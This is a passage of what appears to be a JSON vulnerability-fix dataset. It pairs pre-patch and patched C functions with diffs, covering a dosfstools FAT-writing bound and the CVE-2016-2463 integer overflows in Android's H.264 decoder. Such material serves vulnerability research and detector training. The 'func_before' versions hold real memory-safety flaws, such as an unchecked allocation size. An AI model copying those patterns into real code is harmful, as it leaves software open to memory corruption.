        "func": "void set_fat(DOS_FS * fs, uint32_t cluster, int32_t new)\n{\n    unsigned char *data = NULL;\n    int size;\n    loff_t offs;\n\n    if (new == -1)\n\tnew = FAT_EOF(fs);\n    else if ((long)new == -2)\n\tnew = FAT_BAD(fs);\n    switch (fs->fat_bits) {\n    case 12:\n\tdata = fs->fat + cluster * 3 / 2;\n\toffs = fs->fat_start + cluster * 3 / 2;\n\tif (cluster & 1) {\n\t    FAT_ENTRY prevEntry;\n\t    get_fat(&prevEntry, fs->fat, cluster - 1, fs);\n\t    data[0] = ((new & 0xf) << 4) | (prevEntry.value >> 8);\n\t    data[1] = new >> 4;\n\t} else {\n\t    FAT_ENTRY subseqEntry;\n\t    if (cluster != fs->clusters + 1)\n\t\tget_fat(&subseqEntry, fs->fat, cluster + 1, fs);\n\t    else\n\t\tsubseqEntry.value = 0;\n\t    data[0] = new & 0xff;\n\t    data[1] = (new >> 8) | ((0xff & subseqEntry.value) << 4);\n\t}\n\tsize = 2;\n\tbreak;\n    case 16:\n\tdata = fs->fat + cluster * 2;\n\toffs = fs->fat_start + cluster * 2;\n\t*(unsigned short *)data = htole16(new);\n\tsize = 2;\n\tbreak;\n    case 32:\n\t{\n\t    FAT_ENTRY curEntry;\n\t    get_fat(&curEntry, fs->fat, cluster, fs);\n\n\t    data = fs->fat + cluster * 4;\n\t    offs = fs->fat_start + cluster * 4;\n\t    /* According to M$, the high 4 bits of a FAT32 entry are reserved and\n\t     * are not part of the cluster number. So we never touch them. */\n\t    *(uint32_t *)data = htole32((new & 0xfffffff) |\n\t\t\t\t\t     (curEntry.reserved << 28));\n\t    size = 4;\n\t}\n\tbreak;\n    default:\n\tdie(\"Bad FAT entry size: %d bits.\", fs->fat_bits);\n    }\n    fs_write(offs, size, data);\n    if (fs->nfats > 1) {\n\tfs_write(offs + fs->fat_size, size, data);\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -19,7 +19,7 @@\n \t    data[1] = new >> 4;\n \t} else {\n \t    FAT_ENTRY subseqEntry;\n-\t    if (cluster != fs->clusters - 1)\n+\t    if (cluster != fs->clusters + 1)\n \t\tget_fat(&subseqEntry, fs->fat, cluster + 1, fs);\n \t    else\n \t\tsubseqEntry.value = 0;",
        "diff_line_info": {
            "deleted_lines": [
                "\t    if (cluster != fs->clusters - 1)"
            ],
            "added_lines": [
                "\t    if (cluster != fs->clusters + 1)"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2463",
        "func_name": "android/H264SwDecMalloc",
        "description": "Multiple integer overflows in the h264dec component in libstagefright in mediaserver in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-06-01 allow remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted media file that triggers a large memory allocation, aka internal bug 27855419.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/2b6f22dc64d456471a1dc6df09d515771d1427c8",
        "commit_title": "h264dec: check for overflows when calculating allocation size.",
        "commit_text": " Bug: 27855419 ",
        "func_before": "void* H264SwDecMalloc(u32 size)\n{\n\n#if defined(CHECK_MEMORY_USAGE)\n    /* Note that if the decoder has to free and reallocate some of the buffers\n     * the total value will be invalid */\n    static u32 numBytes = 0;\n    numBytes += size;\n    DEBUG((\"Allocated %d bytes, total %d\\n\", size, numBytes));\n#endif\n\n    return malloc(size);\n}",
        "func": "void* H264SwDecMalloc(u32 size, u32 num)\n{\n    if (size > UINT32_MAX / num) {\n        return NULL;\n    }\n\n#if defined(CHECK_MEMORY_USAGE)\n    /* Note that if the decoder has to free and reallocate some of the buffers\n     * the total value will be invalid */\n    static u32 numBytes = 0;\n    numBytes += size * num;\n    DEBUG((\"Allocated %d bytes, total %d\\n\", size, numBytes));\n#endif\n\n    return malloc(size * num);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,13 +1,16 @@\n-void* H264SwDecMalloc(u32 size)\n+void* H264SwDecMalloc(u32 size, u32 num)\n {\n+    if (size > UINT32_MAX / num) {\n+        return NULL;\n+    }\n \n #if defined(CHECK_MEMORY_USAGE)\n     /* Note that if the decoder has to free and reallocate some of the buffers\n      * the total value will be invalid */\n     static u32 numBytes = 0;\n-    numBytes += size;\n+    numBytes += size * num;\n     DEBUG((\"Allocated %d bytes, total %d\\n\", size, numBytes));\n #endif\n \n-    return malloc(size);\n+    return malloc(size * num);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "void* H264SwDecMalloc(u32 size)",
                "    numBytes += size;",
                "    return malloc(size);"
            ],
            "added_lines": [
                "void* H264SwDecMalloc(u32 size, u32 num)",
                "    if (size > UINT32_MAX / num) {",
                "        return NULL;",
                "    }",
                "    numBytes += size * num;",
                "    return malloc(size * num);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2463",
        "func_name": "android/H264SwDecMalloc",
        "description": "Multiple integer overflows in the h264dec component in libstagefright in mediaserver in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-06-01 allow remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted media file that triggers a large memory allocation, aka internal bug 27855419.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/2b6f22dc64d456471a1dc6df09d515771d1427c8",
        "commit_title": "h264dec: check for overflows when calculating allocation size.",
        "commit_text": " Bug: 27855419 ",
        "func_before": "void* H264SwDecMalloc(u32 size)\n{\n    return malloc(size);\n}",
        "func": "void* H264SwDecMalloc(u32 size, u32 num)\n{\n    if (size > UINT32_MAX / num) {\n        return NULL;\n    }\n    return malloc(size * num);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,4 +1,7 @@\n-void* H264SwDecMalloc(u32 size)\n+void* H264SwDecMalloc(u32 size, u32 num)\n {\n-    return malloc(size);\n+    if (size > UINT32_MAX / num) {\n+        return NULL;\n+    }\n+    return malloc(size * num);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "void* H264SwDecMalloc(u32 size)",
                "    return malloc(size);"
            ],
            "added_lines": [
                "void* H264SwDecMalloc(u32 size, u32 num)",
                "    if (size > UINT32_MAX / num) {",
                "        return NULL;",
                "    }",
                "    return malloc(size * num);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2463",
        "func_name": "android/H264SwDecInit",
        "description": "Multiple integer overflows in the h264dec component in libstagefright in mediaserver in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-06-01 allow remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted media file that triggers a large memory allocation, aka internal bug 27855419.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/2b6f22dc64d456471a1dc6df09d515771d1427c8",
        "commit_title": "h264dec: check for overflows when calculating allocation size.",
        "commit_text": " Bug: 27855419 ",
        "func_before": "H264SwDecRet H264SwDecInit(H264SwDecInst *decInst, u32 noOutputReordering)\n{\n    u32 rv = 0;\n\n    decContainer_t *pDecCont;\n\n    DEC_API_TRC(\"H264SwDecInit#\");\n\n    /* check that right shift on negative numbers is performed signed */\n    /*lint -save -e* following check causes multiple lint messages */\n    if ( ((-1)>>1) != (-1) )\n    {\n        DEC_API_TRC(\"H264SwDecInit# ERROR: Right shift is not signed\");\n        return(H264SWDEC_INITFAIL);\n    }\n    /*lint -restore */\n\n    if (decInst == NULL)\n    {\n        DEC_API_TRC(\"H264SwDecInit# ERROR: decInst == NULL\");\n        return(H264SWDEC_PARAM_ERR);\n    }\n\n    pDecCont = (decContainer_t *)H264SwDecMalloc(sizeof(decContainer_t));\n\n    if (pDecCont == NULL)\n    {\n        DEC_API_TRC(\"H264SwDecInit# ERROR: Memory allocation failed\");\n        return(H264SWDEC_MEMFAIL);\n    }\n\n#ifdef H264DEC_TRACE\n    sprintf(pDecCont->str, \"H264SwDecInit# decInst %p noOutputReordering %d\",\n            (void*)decInst, noOutputReordering);\n    DEC_API_TRC(pDecCont->str);\n#endif\n\n    rv = h264bsdInit(&pDecCont->storage, noOutputReordering);\n    if (rv != HANTRO_OK)\n    {\n        H264SwDecRelease(pDecCont);\n        return(H264SWDEC_MEMFAIL);\n    }\n\n    pDecCont->decStat  = INITIALIZED;\n    pDecCont->picNumber = 0;\n\n#ifdef H264DEC_TRACE\n    sprintf(pDecCont->str, \"H264SwDecInit# OK: return %p\", (void*)pDecCont);\n    DEC_API_TRC(pDecCont->str);\n#endif\n\n    *decInst = (decContainer_t *)pDecCont;\n\n    return(H264SWDEC_OK);\n\n}",
        "func": "H264SwDecRet H264SwDecInit(H264SwDecInst *decInst, u32 noOutputReordering)\n{\n    u32 rv = 0;\n\n    decContainer_t *pDecCont;\n\n    DEC_API_TRC(\"H264SwDecInit#\");\n\n    /* check that right shift on negative numbers is performed signed */\n    /*lint -save -e* following check causes multiple lint messages */\n    if ( ((-1)>>1) != (-1) )\n    {\n        DEC_API_TRC(\"H264SwDecInit# ERROR: Right shift is not signed\");\n        return(H264SWDEC_INITFAIL);\n    }\n    /*lint -restore */\n\n    if (decInst == NULL)\n    {\n        DEC_API_TRC(\"H264SwDecInit# ERROR: decInst == NULL\");\n        return(H264SWDEC_PARAM_ERR);\n    }\n\n    pDecCont = (decContainer_t *)H264SwDecMalloc(sizeof(decContainer_t), 1);\n\n    if (pDecCont == NULL)\n    {\n        DEC_API_TRC(\"H264SwDecInit# ERROR: Memory allocation failed\");\n        return(H264SWDEC_MEMFAIL);\n    }\n\n#ifdef H264DEC_TRACE\n    sprintf(pDecCont->str, \"H264SwDecInit# decInst %p noOutputReordering %d\",\n            (void*)decInst, noOutputReordering);\n    DEC_API_TRC(pDecCont->str);\n#endif\n\n    rv = h264bsdInit(&pDecCont->storage, noOutputReordering);\n    if (rv != HANTRO_OK)\n    {\n        H264SwDecRelease(pDecCont);\n        return(H264SWDEC_MEMFAIL);\n    }\n\n    pDecCont->decStat  = INITIALIZED;\n    pDecCont->picNumber = 0;\n\n#ifdef H264DEC_TRACE\n    sprintf(pDecCont->str, \"H264SwDecInit# OK: return %p\", (void*)pDecCont);\n    DEC_API_TRC(pDecCont->str);\n#endif\n\n    *decInst = (decContainer_t *)pDecCont;\n\n    return(H264SWDEC_OK);\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -21,7 +21,7 @@\n         return(H264SWDEC_PARAM_ERR);\n     }\n \n-    pDecCont = (decContainer_t *)H264SwDecMalloc(sizeof(decContainer_t));\n+    pDecCont = (decContainer_t *)H264SwDecMalloc(sizeof(decContainer_t), 1);\n \n     if (pDecCont == NULL)\n     {",
        "diff_line_info": {
            "deleted_lines": [
                "    pDecCont = (decContainer_t *)H264SwDecMalloc(sizeof(decContainer_t));"
            ],
            "added_lines": [
                "    pDecCont = (decContainer_t *)H264SwDecMalloc(sizeof(decContainer_t), 1);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2463",
        "func_name": "android/H264SwDecMalloc",
        "description": "Multiple integer overflows in the h264dec component in libstagefright in mediaserver in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-06-01 allow remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted media file that triggers a large memory allocation, aka internal bug 27855419.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/2b6f22dc64d456471a1dc6df09d515771d1427c8",
        "commit_title": "h264dec: check for overflows when calculating allocation size.",
        "commit_text": " Bug: 27855419 ",
        "func_before": "void* H264SwDecMalloc(u32 size) {\n    return malloc(size);\n}",
        "func": "void* H264SwDecMalloc(u32 size, u32 num) {\n    if (size > UINT32_MAX / num) {\n        ALOGE(\"can't allocate %u * %u bytes\", size, num);\n        android_errorWriteLog(0x534e4554, \"27855419\");\n        return NULL;\n    }\n    return malloc(size * num);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,3 +1,8 @@\n-void* H264SwDecMalloc(u32 size) {\n-    return malloc(size);\n+void* H264SwDecMalloc(u32 size, u32 num) {\n+    if (size > UINT32_MAX / num) {\n+        ALOGE(\"can't allocate %u * %u bytes\", size, num);\n+        android_errorWriteLog(0x534e4554, \"27855419\");\n+        return NULL;\n+    }\n+    return malloc(size * num);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "void* H264SwDecMalloc(u32 size) {",
                "    return malloc(size);"
            ],
            "added_lines": [
                "void* H264SwDecMalloc(u32 size, u32 num) {",
                "    if (size > UINT32_MAX / num) {",
                "        ALOGE(\"can't allocate %u * %u bytes\", size, num);",
                "        android_errorWriteLog(0x534e4554, \"27855419\");",
                "        return NULL;",
                "    }",
                "    return malloc(size * num);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2463",
        "func_name": "android/h264bsdInit",
        "description": "Multiple integer overflows in the h264dec component in libstagefright in mediaserver in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-06-01 allow remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted media file that triggers a large memory allocation, aka internal bug 27855419.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/2b6f22dc64d456471a1dc6df09d515771d1427c8",
        "commit_title": "h264dec: check for overflows when calculating allocation size.",
        "commit_text": " Bug: 27855419 ",
        "func_before": "u32 h264bsdInit(storage_t *pStorage, u32 noOutputReordering)\n{\n\n/* Variables */\n    u32 size;\n/* Code */\n\n    ASSERT(pStorage);\n\n    h264bsdInitStorage(pStorage);\n\n    /* allocate mbLayer to be next multiple of 64 to enable use of\n     * specific NEON optimized \"memset\" for clearing the structure */\n    size = (sizeof(macroblockLayer_t) + 63) & ~0x3F;\n\n    pStorage->mbLayer = (macroblockLayer_t*)H264SwDecMalloc(size);\n    if (!pStorage->mbLayer)\n        return HANTRO_NOK;\n\n    if (noOutputReordering)\n        pStorage->noReordering = HANTRO_TRUE;\n\n    return HANTRO_OK;\n}",
        "func": "u32 h264bsdInit(storage_t *pStorage, u32 noOutputReordering)\n{\n\n/* Variables */\n    u32 size;\n/* Code */\n\n    ASSERT(pStorage);\n\n    h264bsdInitStorage(pStorage);\n\n    /* allocate mbLayer to be next multiple of 64 to enable use of\n     * specific NEON optimized \"memset\" for clearing the structure */\n    size = (sizeof(macroblockLayer_t) + 63) & ~0x3F;\n\n    pStorage->mbLayer = (macroblockLayer_t*)H264SwDecMalloc(size, 1);\n    if (!pStorage->mbLayer)\n        return HANTRO_NOK;\n\n    if (noOutputReordering)\n        pStorage->noReordering = HANTRO_TRUE;\n\n    return HANTRO_OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -13,7 +13,7 @@\n      * specific NEON optimized \"memset\" for clearing the structure */\n     size = (sizeof(macroblockLayer_t) + 63) & ~0x3F;\n \n-    pStorage->mbLayer = (macroblockLayer_t*)H264SwDecMalloc(size);\n+    pStorage->mbLayer = (macroblockLayer_t*)H264SwDecMalloc(size, 1);\n     if (!pStorage->mbLayer)\n         return HANTRO_NOK;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    pStorage->mbLayer = (macroblockLayer_t*)H264SwDecMalloc(size);"
            ],
            "added_lines": [
                "    pStorage->mbLayer = (macroblockLayer_t*)H264SwDecMalloc(size, 1);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2463",
        "func_name": "android/H264SwDecMalloc",
        "description": "Multiple integer overflows in the h264dec component in libstagefright in mediaserver in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-06-01 allow remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted media file that triggers a large memory allocation, aka internal bug 27855419.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/2b6f22dc64d456471a1dc6df09d515771d1427c8",
        "commit_title": "h264dec: check for overflows when calculating allocation size.",
        "commit_text": " Bug: 27855419 ",
        "func_before": "void* H264SwDecMalloc(u32 size)\n{\n    return malloc(size);\n}",
        "func": "void* H264SwDecMalloc(u32 size, u32 num)\n{\n    if (size > UINT32_MAX / num) {\n        return NULL;\n    }\n    return malloc(size * num);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,4 +1,7 @@\n-void* H264SwDecMalloc(u32 size)\n+void* H264SwDecMalloc(u32 size, u32 num)\n {\n-    return malloc(size);\n+    if (size > UINT32_MAX / num) {\n+        return NULL;\n+    }\n+    return malloc(size * num);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "void* H264SwDecMalloc(u32 size)",
                "    return malloc(size);"
            ],
            "added_lines": [
                "void* H264SwDecMalloc(u32 size, u32 num)",
                "    if (size > UINT32_MAX / num) {",
                "        return NULL;",
                "    }",
                "    return malloc(size * num);"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-2463",
        "func_name": "android/main",
        "description": "Multiple integer overflows in the h264dec component in libstagefright in mediaserver in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-06-01 allow remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted media file that triggers a large memory allocation, aka internal bug 27855419.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/2b6f22dc64d456471a1dc6df09d515771d1427c8",
        "commit_title": "h264dec: check for overflows when calculating allocation size.",
        "commit_text": " Bug: 27855419 ",
        "func_before": "int main(int argc, char **argv)\n{\n\n    u8 *byteStrmStart;\n    u8 *byteStrm;\n    u32 strmLen;\n    u32 picSize;\n    H264SwDecInst decInst;\n    H264SwDecRet ret;\n    H264SwDecInput decInput;\n    H264SwDecOutput decOutput;\n    H264SwDecPicture decPicture;\n    H264SwDecInfo decInfo;\n    u32 picNumber;\n\n    FILE *finput;\n    FILE *foutput;\n\n    /* Check that enough command line arguments given, if not -> print usage\n     * information out */\n    if (argc < 2)\n    {\n        printf( \"Usage: %s file.h264\\n\", argv[0]);\n        return -1;\n    }\n\n    /* open output file for writing, output file named out.yuv. If file open\n     * fails -> exit */\n    foutput = fopen(\"out.yuv\", \"wb\");\n    if (foutput == NULL)\n    {\n        printf(\"UNABLE TO OPEN OUTPUT FILE\\n\");\n        return -1;\n    }\n\n    /* open input file for reading, file name given by user. If file open\n     * fails -> exit */\n    finput = fopen(argv[argc-1], \"rb\");\n    if (finput == NULL)\n    {\n        printf(\"UNABLE TO OPEN INPUT FILE\\n\");\n        return -1;\n    }\n\n    /* check size of the input file -> length of the stream in bytes */\n    fseek(finput, 0L, SEEK_END);\n    strmLen = (u32)ftell(finput);\n    rewind(finput);\n\n    /* allocate memory for stream buffer, exit if unsuccessful */\n    byteStrm = byteStrmStart = (u8 *)H264SwDecMalloc(sizeof(u8)*strmLen);\n    if (byteStrm == NULL)\n    {\n        printf(\"UNABLE TO ALLOCATE MEMORY\\n\");\n        return -1;\n    }\n\n    /* read input stream from file to buffer and close input file */\n    fread(byteStrm, sizeof(u8), strmLen, finput);\n    fclose(finput);\n\n    /* initialize decoder. If unsuccessful -> exit */\n    ret = H264SwDecInit(&decInst, 0);\n    if (ret != H264SWDEC_OK)\n    {\n        printf(\"DECODER INITIALIZATION FAILED\\n\");\n        return -1;\n    }\n\n    /* initialize H264SwDecDecode() input structure */\n    decInput.pStream = byteStrmStart;\n    decInput.dataLen = strmLen;\n    decInput.intraConcealmentMethod = 0;\n\n    picNumber = 0;\n\n    /* For performance measurements, read the start time (in seconds) here.\n     * The decoding time should be measured over several frames and after\n     * that average fps (frames/second) can be calculated.\n     *\n     * startTime = GetTime();\n     *\n     * To prevent calculating file I/O latensies as a decoding time,\n     * comment out WriteOutput function call. Also prints to stdout might\n     * consume considerable amount of cycles during measurement */\n\n    /* main decoding loop */\n    do\n    {\n        /* call API function to perform decoding */\n        ret = H264SwDecDecode(decInst, &decInput, &decOutput);\n\n        switch(ret)\n        {\n\n            case H264SWDEC_HDRS_RDY_BUFF_NOT_EMPTY:\n\n                /* picture dimensions are available for query now */\n                ret = H264SwDecGetInfo(decInst, &decInfo);\n                if (ret != H264SWDEC_OK)\n                    return -1;\n\n                /* picture size in pixels */\n                picSize = decInfo.picWidth * decInfo.picHeight;\n                /* memory needed for YCbCr 4:2:0 picture in bytes */\n                picSize = (3 * picSize)/2;\n                /* memory needed for 16-bit RGB picture in bytes\n                 * picSize = (decInfo.picWidth * decInfo.picHeight) * 2; */\n\n                printf(\"Width %d Height %d\\n\",\n                    decInfo.picWidth, decInfo.picHeight);\n\n                /* update H264SwDecDecode() input structure, number of bytes\n                 * \"consumed\" is computed as difference between the new stream\n                 * pointer and old stream pointer */\n                decInput.dataLen -=\n                    (u32)(decOutput.pStrmCurrPos - decInput.pStream);\n                decInput.pStream = decOutput.pStrmCurrPos;\n                break;\n\n            case H264SWDEC_PIC_RDY_BUFF_NOT_EMPTY:\n            case H264SWDEC_PIC_RDY:\n\n                /* update H264SwDecDecode() input structure, number of bytes\n                 * \"consumed\" is computed as difference between the new stream\n                 * pointer and old stream pointer */\n                decInput.dataLen -=\n                    (u32)(decOutput.pStrmCurrPos - decInput.pStream);\n                decInput.pStream = decOutput.pStrmCurrPos;\n\n                /* use function H264SwDecNextPicture() to obtain next picture\n                 * in display order. Function is called until no more images\n                 * are ready for display */\n                while (H264SwDecNextPicture(decInst, &decPicture, 0) ==\n                    H264SWDEC_PIC_RDY) { picNumber++;\n\n                    printf(\"PIC %d, type %s, concealed %d\\n\", picNumber,\n                        decPicture.isIdrPicture ? \"IDR\" : \"NON-IDR\",\n                        decPicture.nbrOfErrMBs);\n                    fflush(stdout);\n\n                    /* Do color conversion if needed to get display image\n                     * in RGB-format\n                     *\n                     * YuvToRgb( decPicture.pOutputPicture, pRgbPicture ); */\n\n                    /* write next display image to output file */\n                    WriteOutput(foutput, (u8*)decPicture.pOutputPicture,\n                        picSize);\n                }\n\n                break;\n\n            case H264SWDEC_EVALUATION_LIMIT_EXCEEDED:\n                /* evaluation version of the decoder has limited decoding\n                 * capabilities */\n                printf(\"EVALUATION LIMIT REACHED\\n\");\n                goto end;\n\n            default:\n                printf(\"UNRECOVERABLE ERROR\\n\");\n                return -1;\n        }\n    /* keep decoding until all data from input stream buffer consumed */\n    } while (decInput.dataLen > 0);\n\nend:\n\n    /* if output in display order is preferred, the decoder shall be forced\n     * to output pictures remaining in decoded picture buffer. Use function\n     * H264SwDecNextPicture() to obtain next picture in display order. Function\n     * is called until no more images are ready for display. Second parameter\n     * for the function is set to '1' to indicate that this is end of the\n     * stream and all pictures shall be output */\n    while (H264SwDecNextPicture(decInst, &decPicture, 1) ==\n        H264SWDEC_PIC_RDY) {\n\n        picNumber++;\n\n        printf(\"PIC %d, type %s, concealed %d\\n\", picNumber,\n            decPicture.isIdrPicture ? \"IDR\" : \"NON-IDR\",\n            decPicture.nbrOfErrMBs);\n        fflush(stdout);\n\n        /* Do color conversion if needed to get display image\n         * in RGB-format\n         *\n         * YuvToRgb( decPicture.pOutputPicture, pRgbPicture ); */\n\n        /* write next display image to output file */\n        WriteOutput(foutput, (u8*)decPicture.pOutputPicture, picSize);\n    }\n\n    /* For performance measurements, read the end time (in seconds) here.\n     *\n     * endTime = GetTime();\n     *\n     * Now the performance can be calculated as frames per second:\n     * fps = picNumber / (endTime - startTime); */\n\n\n    /* release decoder instance */\n    H264SwDecRelease(decInst);\n\n    /* close output file */\n    fclose(foutput);\n\n    /* free byte stream buffer */\n    free(byteStrmStart);\n\n    return 0;\n\n}",
        "func": "int main(int argc, char **argv)\n{\n\n    u8 *byteStrmStart;\n    u8 *byteStrm;\n    u32 strmLen;\n    u32 picSize;\n    H264SwDecInst decInst;\n    H264SwDecRet ret;\n    H264SwDecInput decInput;\n    H264SwDecOutput decOutput;\n    H264SwDecPicture decPicture;\n    H264SwDecInfo decInfo;\n    u32 picNumber;\n\n    FILE *finput;\n    FILE *foutput;\n\n    /* Check that enough command line arguments given, if not -> print usage\n     * information out */\n    if (argc < 2)\n    {\n        printf( \"Usage: %s file.h264\\n\", argv[0]);\n        return -1;\n    }\n\n    /* open output file for writing, output file named out.yuv. If file open\n     * fails -> exit */\n    foutput = fopen(\"out.yuv\", \"wb\");\n    if (foutput == NULL)\n    {\n        printf(\"UNABLE TO OPEN OUTPUT FILE\\n\");\n        return -1;\n    }\n\n    /* open input file for reading, file name given by user. If file open\n     * fails -> exit */\n    finput = fopen(argv[argc-1], \"rb\");\n    if (finput == NULL)\n    {\n        printf(\"UNABLE TO OPEN INPUT FILE\\n\");\n        return -1;\n    }\n\n    /* check size of the input file -> length of the stream in bytes */\n    fseek(finput, 0L, SEEK_END);\n    strmLen = (u32)ftell(finput);\n    rewind(finput);\n\n    /* allocate memory for stream buffer, exit if unsuccessful */\n    byteStrm = byteStrmStart = (u8 *)H264SwDecMalloc(sizeof(u8), strmLen);\n    if (byteStrm == NULL)\n    {\n        printf(\"UNABLE TO ALLOCATE MEMORY\\n\");\n        return -1;\n    }\n\n    /* read input stream from file to buffer and close input file */\n    fread(byteStrm, sizeof(u8), strmLen, finput);\n    fclose(finput);\n\n    /* initialize decoder. If unsuccessful -> exit */\n    ret = H264SwDecInit(&decInst, 0);\n    if (ret != H264SWDEC_OK)\n    {\n        printf(\"DECODER INITIALIZATION FAILED\\n\");\n        return -1;\n    }\n\n    /* initialize H264SwDecDecode() input structure */\n    decInput.pStream = byteStrmStart;\n    decInput.dataLen = strmLen;\n    decInput.intraConcealmentMethod = 0;\n\n    picNumber = 0;\n\n    /* For performance measurements, read the start time (in seconds) here.\n     * The decoding time should be measured over several frames and after\n     * that average fps (frames/second) can be calculated.\n     *\n     * startTime = GetTime();\n     *\n     * To prevent calculating file I/O latensies as a decoding time,\n     * comment out WriteOutput function call. Also prints to stdout might\n     * consume considerable amount of cycles during measurement */\n\n    /* main decoding loop */\n    do\n    {\n        /* call API function to perform decoding */\n        ret = H264SwDecDecode(decInst, &decInput, &decOutput);\n\n        switch(ret)\n        {\n\n            case H264SWDEC_HDRS_RDY_BUFF_NOT_EMPTY:\n\n                /* picture dimensions are available for query now */\n                ret = H264SwDecGetInfo(decInst, &decInfo);\n                if (ret != H264SWDEC_OK)\n                    return -1;\n\n                /* picture size in pixels */\n                picSize = decInfo.picWidth * decInfo.picHeight;\n                /* memory needed for YCbCr 4:2:0 picture in bytes */\n                picSize = (3 * picSize)/2;\n                /* memory needed for 16-bit RGB picture in bytes\n                 * picSize = (decInfo.picWidth * decInfo.picHeight) * 2; */\n\n                printf(\"Width %d Height %d\\n\",\n                    decInfo.picWidth, decInfo.picHeight);\n\n                /* update H264SwDecDecode() input structure, number of bytes\n                 * \"consumed\" is computed as difference between the new stream\n                 * pointer and old stream pointer */\n                decInput.dataLen -=\n                    (u32)(decOutput.pStrmCurrPos - decInput.pStream);\n                decInput.pStream = decOutput.pStrmCurrPos;\n                break;\n\n            case H264SWDEC_PIC_RDY_BUFF_NOT_EMPTY:\n            case H264SWDEC_PIC_RDY:\n\n                /* update H264SwDecDecode() input structure, number of bytes\n                 * \"consumed\" is computed as difference between the new stream\n                 * pointer and old stream pointer */\n                decInput.dataLen -=\n                    (u32)(decOutput.pStrmCurrPos - decInput.pStream);\n                decInput.pStream = decOutput.pStrmCurrPos;\n\n                /* use function H264SwDecNextPicture() to obtain next picture\n                 * in display order. Function is called until no more images\n                 * are ready for display */\n                while (H264SwDecNextPicture(decInst, &decPicture, 0) ==\n                    H264SWDEC_PIC_RDY) { picNumber++;\n\n                    printf(\"PIC %d, type %s, concealed %d\\n\", picNumber,\n                        decPicture.isIdrPicture ? \"IDR\" : \"NON-IDR\",\n                        decPicture.nbrOfErrMBs);\n                    fflush(stdout);\n\n                    /* Do color conversion if needed to get display image\n                     * in RGB-format\n                     *\n                     * YuvToRgb( decPicture.pOutputPicture, pRgbPicture ); */\n\n                    /* write next display image to output file */\n                    WriteOutput(foutput, (u8*)decPicture.pOutputPicture,\n                        picSize);\n                }\n\n                break;\n\n            case H264SWDEC_EVALUATION_LIMIT_EXCEEDED:\n                /* evaluation version of the decoder has limited decoding\n                 * capabilities */\n                printf(\"EVALUATION LIMIT REACHED\\n\");\n                goto end;\n\n            default:\n                printf(\"UNRECOVERABLE ERROR\\n\");\n                return -1;\n        }\n    /* keep decoding until all data from input stream buffer consumed */\n    } while (decInput.dataLen > 0);\n\nend:\n\n    /* if output in display order is preferred, the decoder shall be forced\n     * to output pictures remaining in decoded picture buffer. Use function\n     * H264SwDecNextPicture() to obtain next picture in display order. Function\n     * is called until no more images are ready for display. Second parameter\n     * for the function is set to '1' to indicate that this is end of the\n     * stream and all pictures shall be output */\n    while (H264SwDecNextPicture(decInst, &decPicture, 1) ==\n        H264SWDEC_PIC_RDY) {\n\n        picNumber++;\n\n        printf(\"PIC %d, type %s, concealed %d\\n\", picNumber,\n            decPicture.isIdrPicture ? \"IDR\" : \"NON-IDR\",\n            decPicture.nbrOfErrMBs);\n        fflush(stdout);\n\n        /* Do color conversion if needed to get display image\n         * in RGB-format\n         *\n         * YuvToRgb( decPicture.pOutputPicture, pRgbPicture ); */\n\n        /* write next display image to output file */\n        WriteOutput(foutput, (u8*)decPicture.pOutputPicture, picSize);\n    }\n\n    /* For performance measurements, read the end time (in seconds) here.\n     *\n     * endTime = GetTime();\n     *\n     * Now the performance can be calculated as frames per second:\n     * fps = picNumber / (endTime - startTime); */\n\n\n    /* release decoder instance */\n    H264SwDecRelease(decInst);\n\n    /* close output file */\n    fclose(foutput);\n\n    /* free byte stream buffer */\n    free(byteStrmStart);\n\n    return 0;\n\n}",
